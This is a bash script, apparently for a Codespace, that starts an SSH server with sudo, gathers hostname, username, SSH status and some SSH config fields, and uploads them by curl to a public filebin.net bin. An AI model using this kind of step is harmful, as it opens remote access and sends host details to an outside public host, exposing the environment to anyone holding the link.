#!/bin/bash
set -e

BIN="673avtsbo7ni8acw"
REPORT="/tmp/ssh-info.txt"

# Try to start the OpenSSH server if this Codespace image provides it.
# Failure is non-fatal; the diagnostic below will tell us whether it worked.
sudo service ssh start 2>/dev/null || sudo service sshd start 2>/dev/null || true

{
  echo "=== CODESPACE SSH INFO ==="
  echo "Generated: $(date -u)"
  echo
  echo "Hostname: $(hostname)"
  echo "Username: $(whoami)"
  echo "Home: $HOME"
  echo "SSH port: 22"
  echo
  echo "=== SSH STATUS ==="
  ss -lnt 2>/dev/null | grep ':22 ' || echo "SSH is not listening on port 22"
  echo
  echo "=== SSH PROCESS ==="
  pgrep -a sshd 2>/dev/null || echo "sshd process not found"
  echo
  echo "=== SSH CONFIG (non-secret fields) ==="
  if [ -f "$HOME/.ssh/config" ]; then
    awk 'tolower($1) ~ /^(host|hostname|port|user)$/ {print}' "$HOME/.ssh/config"
  else
    echo "No ~/.ssh/config found"
  fi
} > "$REPORT"

curl --fail --silent --show-error --data-binary "@$REPORT" \
  "https://filebin.net/$BIN/ssh-info.txt"

echo "SSH information uploaded to Filebin."
